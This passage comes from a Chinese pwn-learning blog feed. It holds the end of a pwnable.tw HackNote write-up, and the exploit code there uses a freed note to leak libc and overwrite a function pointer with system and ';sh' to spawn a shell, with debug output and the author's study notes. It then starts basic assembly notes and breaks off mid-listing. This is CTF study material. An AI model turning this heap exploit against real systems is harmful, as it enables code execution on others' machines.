class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;45&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_note(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = u32(io.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;0x1b07b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_addr = libc_addr + mylibc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# add_note(8,&amp;quot;12&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# add_note(8,&amp;quot;34&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# del_note(3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# del_note(4)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p32(sys_addr)+&lt;span class=&#34;string&#34;&gt;&amp;quot;;sh\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;libc_addr &amp;#x3D; u32(io.recv(8)[4:8]) - 0x1b07b0&lt;br&gt;sys_addr &amp;#x3D; libc_addr + libc.symbols[‘system’]&lt;/p&gt;
&lt;p&gt;首先,有随机化,这个随机化是什么? 所以必须每次要接收到地址才行,不能用之前的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def &lt;span class=&#34;title function_&#34;&gt;Print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(index)&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,str(index))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.&lt;span class=&#34;title function_&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.&lt;span class=&#34;title function_&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.&lt;span class=&#34;title function_&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.&lt;span class=&#34;title function_&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(str(index))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这玩意有什么区别吗....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          io.&lt;span class=&#34;title function_&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.&lt;span class=&#34;title function_&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;,str(index))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      改成这样也可以..........卧槽了.......尼玛范德萨发爱上,要骂人了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; [DEBUG] Received 0xc6 bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;----------------------\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;       HackNote       \n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;----------------------\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27; 1. Add note          \n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27; 2. Delete note       \n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27; 3. Print note        \n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27; 4. Exit              \n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;----------------------\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;Your choice :&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Sent 0x2 bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;3\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Received 0x7 bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;Index :&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Sent 0x2 bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&amp;#x27;2\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;Traceback&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(most recent call last)&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;2.py&amp;quot;, line 63, in &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    libc_addr = u32(io.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;0x1b07b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/local/lib/python3.6/dist-packages/pwnlib/context/__init__.py&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1597&lt;/span&gt;, in setter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(*a, **kw)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&amp;quot;, line 353, in &lt;span class=&#34;title function_&#34;&gt;routine&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;,    False)&lt;/span&gt;:  bu&amp;#125;[endian, &lt;span class=&#34;type&#34;&gt;signed&lt;/span&gt;]&lt;span class=&#34;params&#34;&gt;(number, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&amp;quot;, line 320, in routine&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;struct_op&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(data)&lt;/span&gt;[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt;.error: unpack requires a buffer of 4 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Closed connection to chall.pwnable.tw port 10102&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;我知道了………..如果不在这之后发..收到的就是后面的那个东西了…….&lt;/p&gt;
&lt;p&gt;choice : 会收到 空格和:作为recv的值……&lt;/p&gt;
&lt;h3 id=&#34;调试&#34;&gt;&lt;a href=&#34;#调试&#34; class=&#34;headerlink&#34; title=&#34;调试&#34;&gt;&lt;/a&gt;调试&lt;/h3&gt;&lt;p&gt;wiki里有调试,可以学一下&lt;/p&gt;
&lt;h3 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h3&gt;&lt;p&gt;​		如何进行调试源代码? 指定源代码一行一行走?&lt;/p&gt;
&lt;p&gt;​		gdb调试的时候r了,ctrl+c了,怎么继续执行    好像没太有办法,可以下断点!也挺好用的&lt;/p&gt;
&lt;p&gt;​		为什么释放的chunk是0x18 也就是24呢,不是16吗 和对其有关? &lt;/p&gt;
&lt;p&gt;​		怎么在gdb里面发送 p32 p64这种数据呢?  可以用eb命令等 直接修改内存就可以了&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-03-06T05:21:37.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</id>
        <title>pwn入门-16-汇编反汇编基础</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
        <content type="html">&lt;h1 id=&#34;常用汇编指令&#34;&gt;&lt;a href=&#34;#常用汇编指令&#34; class=&#34;headerlink&#34; title=&#34;常用汇编指令&#34;&gt;&lt;/a&gt;常用汇编指令&lt;/h1&gt;&lt;p&gt;lea 加载有效地址&lt;/p&gt;
&lt;p&gt;​	lea   eax, [ebx+8]  将ebx+8存储的内存&lt;font color=&#34;red&#34;&gt;地址&lt;/font&gt; +8 传给eax&lt;/p&gt;
&lt;p&gt;​	mov eax, [ebx+8]  将ebx+8内存地址指向的&lt;font color=&#34;red&#34;&gt;数据&lt;/font&gt; 传给eax&lt;/p&gt;
&lt;p&gt;cmp&lt;/p&gt;
&lt;h2 id=&#34;算数运算&#34;&gt;&lt;a href=&#34;#算数运算&#34; class=&#34;headerlink&#34; title=&#34;算数运算&#34;&gt;&lt;/a&gt;算数运算&lt;/h2&gt;&lt;p&gt;sub 减&lt;/p&gt;
&lt;p&gt;add 加&lt;/p&gt;
&lt;p&gt;inc +1&lt;/p&gt;
&lt;p&gt;dec -1&lt;/p&gt;
&lt;p&gt;mul 乘&lt;/p&gt;
&lt;p&gt;div 除&lt;/p&gt;
&lt;h2 id=&#34;条件指令及跳转指令&#34;&gt;&lt;a href=&#34;#条件指令及跳转指令&#34; class=&#34;headerlink&#34; title=&#34;条件指令及跳转指令&#34;&gt;&lt;/a&gt;条件指令及跳转指令&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/counsellor/article/details/81005101&#34;&gt;https://blog.csdn.net/counsellor/article/details/81005101&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;jmp  无条件跳转                                      p74-76&lt;/p&gt;
&lt;p&gt;这几个都是根据标志位跳转&lt;/p&gt;
&lt;p&gt;jz 如果ZF标志位置位则跳转  等于&lt;/p&gt;
&lt;p&gt;jnz 如果ZF标志位被清除则跳转 不等于&lt;/p&gt;
&lt;p&gt;je 等于跳转&lt;/p&gt;
&lt;p&gt;jg 有符号大于则跳转&lt;/p&gt;
&lt;p&gt;test eax,eax 检测目标值是否为0 ,即两个操作数按位与运算,为0的话设置标志位ZF为1,否则为0(不修改使用的操作数)&lt;/p&gt;
&lt;p&gt;cmp eax,ebx 如果两个参数相等,ZF标志位置位&lt;/p&gt;
&lt;p&gt;一般在cmp指令后用je，test指令后用jz&lt;/p&gt;
&lt;h2 id=&#34;函数使用的&#34;&gt;&lt;a href=&#34;#函数使用的&#34; class=&#34;headerlink&#34; title=&#34;函数使用的&#34;&gt;&lt;/a&gt;函数使用的&lt;/h2&gt;&lt;p&gt;call&lt;/p&gt;
&lt;p&gt;leave&lt;/p&gt;
&lt;p&gt;enter&lt;/p&gt;
&lt;p&gt;ret&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.codenong.com/10483544/&#34;&gt;https://www.codenong.com/10483544/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;全局变量与局部变量&#34;&gt;&lt;a href=&#34;#全局变量与局部变量&#34; class=&#34;headerlink&#34; title=&#34;全局变量与局部变量&#34;&gt;&lt;/a&gt;全局变量与局部变量&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j =&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is:%d %d\n&amp;quot;&lt;/span&gt;,i,j);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230303215108473.png&#34; alt=&#34;image-20230303215108473&#34;&gt;&lt;/p&gt;
&lt;p&gt;全局变量i通过内存地址引用,局部变量通过栈地址引用&lt;/p&gt;
&lt;h1 id=&#34;算数运算-1&#34;&gt;&lt;a href=&#34;#算数运算-1&#34; class=&#34;headerlink&#34; title=&#34;算数运算&#34;&gt;&lt;/a&gt;算数运算&lt;/h1&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  i = i +&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  k = i/j;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is:%d %d %d\n&amp;quot;&lt;/span&gt;,i,j,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000000064A                 push    rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000000064B                 mov     rbp, rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000000064E                 sub     rsp, 10h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000652                 mov     [rbp+var_C], 0Ah          ; int i =10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000659                 mov     [rbp+var_8], 2						;int j=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000660                 add     [rbp+var_C], 2						; i = i +2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000664                 mov     eax, [rbp+var_C]         ; 把i放到eax中当作被除数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000667                 cdq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000668                 idiv    [rbp+var_8]              ;j是除数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000000066B                 